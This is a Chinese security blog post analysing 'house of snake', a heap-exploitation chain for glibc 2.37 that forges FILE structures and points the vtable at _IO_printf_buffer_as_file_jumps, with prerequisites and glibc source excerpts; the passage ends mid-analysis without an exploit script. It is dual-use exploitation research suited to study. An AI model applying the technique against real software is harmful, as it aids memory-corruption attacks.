<!DOCTYPE html>
<html>
  <head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
  <meta name="description" content="">
  <meta name="keyword" content="">
  <title>
    
      house_of_snake:_IO_printf_buffer_as_file_jumps利用分析 | 7resp4ss&#39;s blog
    
  </title>
  <!-- <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css"> -->

  <!-- <link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"> -->
  <!-- <link href="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.css" rel="stylesheet"> -->
  <!-- <link href="https://cdn.bootcss.com/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet"> -->
  
<link rel="stylesheet" href="/css/style.css">
<link rel="stylesheet" href="/css/highlight_tomorrow.min.css">

  <!-- <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script> -->
  <!-- <script src="//cdn.bootcss.com/geopattern/1.2.3/js/geopattern.min.js"></script> -->
  <!-- <script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script> -->
  <!-- 
<script src="/js/qrious.js"></script>
<script src="/js/gitment.js"></script>
 -->
  
<script src="/js/jquery.min.js"></script>
<script src="/js/geopattern.min.js"></script>
<script src="/js/highlight.min.js"></script>
<script src="/js/fastclick.min.js"></script>


  
  <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-104099189-1', 'auto');
    ga('send', 'pageview');

  </script>


</head>
  <body>
    <header class="header fixed-header">
  <div class="header-container">
    <a class="home-link" href="/">
      <div class="logo"></div>
      <!-- <span>7resp4ss's blog</span> -->
    </a>
    <ul class="right-list">
      
        <li class="list-item" >
          <!-- <div class="tooltip"> -->
            <!-- <span class="tooltiptext">🏷</span> -->

            
            <a href="/tags/" class="item-link">🏷</a>
          
        </li>
      
        <li class="list-item" >
          <!-- <div class="tooltip"> -->
            <!-- <span class="tooltiptext">👨🏻‍💻</span> -->

            
            <a href="/about/" class="item-link">👨🏻‍💻</a>
          
        </li>
      
    </ul>
    <div class="menu">
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
    </div>
    <div class="menu-mask">
      <ul class="menu-list">
        
          <li class="menu-item">
            
              <a href="/tags/" class="menu-link">🏷</a>
            
          </li>
        
          <li class="menu-item">
            
              <a href="/about/" class="menu-link">👨🏻‍💻</a>
            
          </li>
        
      </ul>
    </div>
  </div>
</header>

    <div id="article-banner">
  <h2>house_of_snake:_IO_printf_buffer_as_file_jumps利用分析</h2>
</div>

<main class="app-body">
  <article class="post-article">
    <section class="markdown-content"   dir=""><h1 id="house-of-snake：-IO-printf-buffer-as-file-jumps利用分析"><a href="#house-of-snake：-IO-printf-buffer-as-file-jumps利用分析" class="headerlink" title="house_of_snake：_IO_printf_buffer_as_file_jumps利用分析"></a>house_of_snake：_IO_printf_buffer_as_file_jumps利用分析</h1><blockquote>
<p>本文首发于[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-276471.htm">看雪论坛</a>]，仅在个人博客记录</p>
</blockquote>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前听说<code>glibc2.37</code>删除了<code>_IO_obstack_jumps</code>这个<code>vtable</code>。但是在源码里还看到<code>obstack</code>结构体存在，那么<code>glibc2.37</code>真的不能再调用<code>_IO_obstack_jumps</code>的那条链吗？看完本文就知道还可以调用_<code>IO_obstack_jumps</code>那条链的关键部分。但目前这条链只存在<code>glibc2.37</code>，所以现在可能还没有利用场景。在此结合源码和自己的理解和大家分享一下，也感谢<code>roderick</code>师傅和<code>whiter</code>师傅的指导与支持。如果有哪里不对恳请师傅们斧正！</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在此，我称这条链为<code>house of snake</code>，此利用链与<code>house of apple</code>、<code>house of cat</code>、<code>house of emma</code>等利用一样，利用了修改虚表指针的方法。主要思路就是伪造相关结构体并且修改虚表指针为<code>_IO_printf_buffer_as_file_jumps</code>实现攻击。</p>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>1.能修改<code>stdout</code>、<code>stdin</code>、<code>stderr</code>其中一个<code>_IO_FILE_plus</code>结构(fastbin attack或tcachebin attack)或劫持 <code>_IO_list_all</code>。(如<code>large bin attack</code>、<code>tcache stashing unlink attack</code>、<code>fastbin reverse into tcache</code>)</p>
<p>2.能够触发<code>IO</code>流，执行<code>IO</code>相关函数。</p>
<p>3.能够泄露堆地址和<code>libc</code>基址。</p>
<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="vtable-劫持的检测措施"><a href="#vtable-劫持的检测措施" class="headerlink" title="vtable 劫持的检测措施"></a>vtable 劫持的检测措施</h4><p>在 <code>2.24</code> 版本的 <code>glibc</code> 以后，加入了针对 <code>IO_FILE_plus</code> 的 <code>vtable</code> 劫持的检测措施，<code>glibc</code> 会在调用虚函数之前首先检查 <code>vtable</code> 地址的合法性。首先会验证 <code>vtable</code> 是否位于<code>_IO_vtable</code> 段中，如果满足条件就正常执行，否则会调用<code>_IO_vtable_check</code> 做进一步检查。</p>
<p>简单来说，如果 vtable 地址是非法的，那么会引发 <code>abort</code>。</p>
<h4 id="IO-FILE结构体"><a href="#IO-FILE结构体" class="headerlink" title="_IO_FILE结构体"></a>_IO_FILE结构体</h4><p>源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">      <span class="type">int</span> _flags;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span> </span><br><span class="line">    <span class="type">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">    <span class="type">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">    <span class="type">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">    <span class="type">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">    <span class="type">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">    <span class="type">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">    <span class="type">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">    <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">    <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">    <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">    <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    _IO_off_t _old_offset;	<span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN	<span class="comment">/* temporary */</span></span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">    <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">    <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line">    _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>该结构体应该不难理解，不过多赘述。</p>
<h4 id="IO-jump-t结构体"><a href="#IO-jump-t结构体" class="headerlink" title="_IO_jump_t结构体"></a>_IO_jump_t结构体</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>当我们对一个文件对象<code>fp</code>进行操作时，往往会使用到<code>_IO_jump_t</code>结构体内某一函数。</p>
<h4 id="IO-FILE-plus结构体"><a href="#IO-FILE-plus结构体" class="headerlink" title="_IO_FILE_plus结构体"></a>_IO_FILE_plus结构体</h4><p>源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>也就是在<code>_IO_FILE</code>追加了个指向<code>_IO_jump_t</code>结构体的指针。</p>
<h4 id="printf-buffer结构体"><a href="#printf-buffer结构体" class="headerlink" title="__printf_buffer结构体"></a>__printf_buffer结构体</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> *write_base;</span><br><span class="line">  <span class="type">char</span> *write_ptr;</span><br><span class="line">  <span class="type">char</span> *write_end;</span><br><span class="line">  <span class="type">uint64_t</span> written;</span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">printf_buffer_mode</span> <span class="title">mode</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>了解存在这个结构体即可。</p>
<h4 id="printf-buffer-as-file结构体"><a href="#printf-buffer-as-file结构体" class="headerlink" title="__printf_buffer_as_file结构体"></a>__printf_buffer_as_file结构体</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_as_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Interface to libio.  */</span></span><br><span class="line">  FILE stream;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Pointer to the underlying buffer.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中<code>FILE</code>就是<code>_IO_FILE_plus</code>，就是在<code>_IO_FILE_plus</code>结构体后追加了个指向<code>__printf_buffer</code>结构体的指针。这个结构体是关键结构体之一，因为本文提及的调用链离不开这个结构体。</p>
<p>简单总结一下，就是一个常见的<code>_IO_FILE_plus</code>后面追加了一个结构体指针，我们只要认识到这一点就行了。</p>
<h4 id="obstack结构体"><a href="#obstack结构体" class="headerlink" title="obstack结构体"></a>obstack结构体</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">obstack</span>          /* <span class="title">control</span> <span class="title">current</span> <span class="title">object</span> <span class="title">in</span> <span class="title">current</span> <span class="title">chunk</span> */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">long</span> chunk_size;              <span class="comment">/* preferred size to allocate chunks in */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">chunk</span>;</span> <span class="comment">/* address of current struct obstack_chunk */</span></span><br><span class="line">  <span class="type">char</span> *object_base;            <span class="comment">/* address of object we are building */</span></span><br><span class="line">  <span class="type">char</span> *next_free;              <span class="comment">/* where to add next char to current object */</span></span><br><span class="line">  <span class="type">char</span> *chunk_limit;            <span class="comment">/* address of char after current chunk */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    PTR_INT_TYPE tempint;</span><br><span class="line">    <span class="type">void</span> *tempptr;</span><br><span class="line">  &#125; temp;                       <span class="comment">/* Temporary for some macros.  */</span></span><br><span class="line">  <span class="type">int</span> alignment_mask;           <span class="comment">/* Mask of alignment for each object. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *(*<span class="title">chunkfun</span>) (<span class="title">void</span> *, <span class="title">long</span>);</span></span><br><span class="line">  <span class="type">void</span> (*freefun) (<span class="type">void</span> *, <span class="keyword">struct</span> _obstack_chunk *);</span><br><span class="line">  <span class="type">void</span> *extra_arg;              <span class="comment">/* first arg for chunk alloc/dealloc funcs */</span></span><br><span class="line">  <span class="type">unsigned</span> use_extra_arg : <span class="number">1</span>;     <span class="comment">/* chunk alloc/dealloc funcs take extra arg */</span></span><br><span class="line">  <span class="type">unsigned</span> maybe_empty_object : <span class="number">1</span>; <span class="comment">/* There is a possibility that the current</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  unsigned alloc_failed : 1;      /* No longer used, as we now call the failed</span></span><br><span class="line"><span class="comment">				     handler on error, but retained for binary</span></span><br><span class="line"><span class="comment">				     compatibility.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在此，我们只需要知道有这个结构体即可，不需要过多的探究每个成员的意义。</p>
<h4 id="printf-buffer-obstack结构体"><a href="#printf-buffer-obstack结构体" class="headerlink" title="__printf_buffer_obstack结构体"></a>__printf_buffer_obstack结构体</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_obstack</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> <span class="title">base</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> ch;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>就是在<code>__printf_buffer</code>结构体后追加了一个<code>obstack</code>结构体指针和一个<code>char</code>类型的变量，这个结构体也是关键结构体之一。</p>
<h3 id="调用链分析"><a href="#调用链分析" class="headerlink" title="调用链分析"></a>调用链分析</h3><h4 id="IO-printf-buffer-as-file-jumps"><a href="#IO-printf-buffer-as-file-jumps" class="headerlink" title="_IO_printf_buffer_as_file_jumps"></a>_IO_printf_buffer_as_file_jumps</h4><p>由上可知，<code>vtable</code>必须合法，在<code>glibc2.37</code>中有一个新的<code>vtable</code>，源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_printf_buffer_as_file_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, __printf_buffer_as_file_overflow),<span class="comment">//函数一</span></span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, __printf_buffer_as_file_xsputn),<span class="comment">//函数二</span></span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可知，该<code>vtable</code>内只存在两个函数，分别为<code>__printf_buffer_as_file_overflow</code>，<code>__printf_buffer_as_file_xsputn</code></p>
<p>接下来我们先对<code>__printf_buffer_as_file_overflow</code>进行分析。</p>
<h6 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h6><p>笔者对该利用链分析先关注调用过程，要绕过的条件先按下不表，最后再总结！</p>
<h6 id="printf-buffer-as-file-overflow函数"><a href="#printf-buffer-as-file-overflow函数" class="headerlink" title="__printf_buffer_as_file_overflow函数"></a>__printf_buffer_as_file_overflow函数</h6><p>源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">__printf_buffer_as_file_overflow (FILE *fp, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_as_file</span> *<span class="title">file</span> =</span> (<span class="keyword">struct</span> __printf_buffer_as_file *) fp;</span><br><span class="line"></span><br><span class="line">  __printf_buffer_as_file_commit (file);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* EOF means only a flush is requested.   */</span></span><br><span class="line">  <span class="keyword">if</span> (ch != EOF)</span><br><span class="line">    __printf_buffer_putc (file-&gt;next, ch);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Ensure that flushing actually produces room.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!__printf_buffer_has_failed (file-&gt;next)</span><br><span class="line">      &amp;&amp; file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end)</span><br><span class="line">    __printf_buffer_flush (file-&gt;next);</span><br><span class="line">	[...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数首先堆传入的第一个参数强制类型转换为<code>__printf_buffer_as_file</code>并赋给变量<code>file</code>，然后调用<code>__printf_buffer_as_file_commit</code>函数，</p>
<h6 id="printf-buffer-as-file-commit函数"><a href="#printf-buffer-as-file-commit函数" class="headerlink" title="__printf_buffer_as_file_commit函数"></a>__printf_buffer_as_file_commit函数</h6><p>该函数源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__printf_buffer_as_file_commit (<span class="keyword">struct</span> __printf_buffer_as_file *file)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Check that the write pointers in the file stream are consistent</span></span><br><span class="line"><span class="comment">     with the next buffer.  */</span></span><br><span class="line">  assert (file-&gt;stream._IO_write_ptr &gt;= file-&gt;next-&gt;write_ptr);</span><br><span class="line">  assert (file-&gt;stream._IO_write_ptr &lt;= file-&gt;next-&gt;write_end);</span><br><span class="line">  assert (file-&gt;stream._IO_write_base == file-&gt;next-&gt;write_base);</span><br><span class="line">  assert (file-&gt;stream._IO_write_end == file-&gt;next-&gt;write_end);</span><br><span class="line"></span><br><span class="line">  file-&gt;next-&gt;write_ptr = file-&gt;stream._IO_write_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出该函数通过断言对<code>file</code>结构体中的<code>stream</code>结构体与<code>next</code>结构体中的成员进行一系列判断，然后做一个赋值的操作。</p>
<h6 id="printf-buffer-putc函数"><a href="#printf-buffer-putc函数" class="headerlink" title="__printf_buffer_putc函数"></a>__printf_buffer_putc函数</h6><p>可以看到若<code>ch != EOF</code>就调用<code>__printf_buffer_putc</code>，源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line">__printf_buffer_putc (<span class="keyword">struct</span> __printf_buffer *buf, <span class="type">char</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (buf-&gt;write_ptr != buf-&gt;write_end)</span><br><span class="line">      *buf-&gt;write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    __printf_buffer_putc_1 (buf, ch);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可知<code>__printf_buffer_putc</code>只是做了一些指针记录的数值加减的操作，对此我们不用过多关注。</p>
<p>然后有判断：<code>if (!__printf_buffer_has_failed (file-&gt;next) &amp;&amp; file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end)</code></p>
<p>就是判断<code>__printf_buffer_as_file</code>结构体中的mode成员是不是<code>__printf_buffer_mode_failed</code>以及<code>file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end</code>，我们假设满足这两个条件，会调用<code>__printf_buffer_flush (file-&gt;next)</code></p>
<h6 id="printf-buffer-flush-函数"><a href="#printf-buffer-flush-函数" class="headerlink" title="__printf_buffer_flush 函数"></a>__printf_buffer_flush 函数</h6><p>这个函数笔者无法直接在源码中找到，但是配合<code>gdb</code>，笔者还是发现了它的蛛丝马迹。</p>
<p>![image-20230313223405618](一条新的glibc IO_FILE利用链：_IO_printf_buffer_as_file_jumps利用分析.assets&#x2F;image-20230313223405618.png)</p>
<p><del>它其实就是<code>__printf_buffer_do_flush</code></del></p>
<p>评论区有师傅（id:我超啊）说该函数其实是<code>__printf_buffer_flush =&gt; Xprintf_buffer_flush =&gt; Xprintf (buffer_do_flush) (buf) =&gt; __printf_buffer_do_flush</code>这样的！但是我们只需要关注<code>__printf_buffer_do_flush</code>，源码如下：</p>
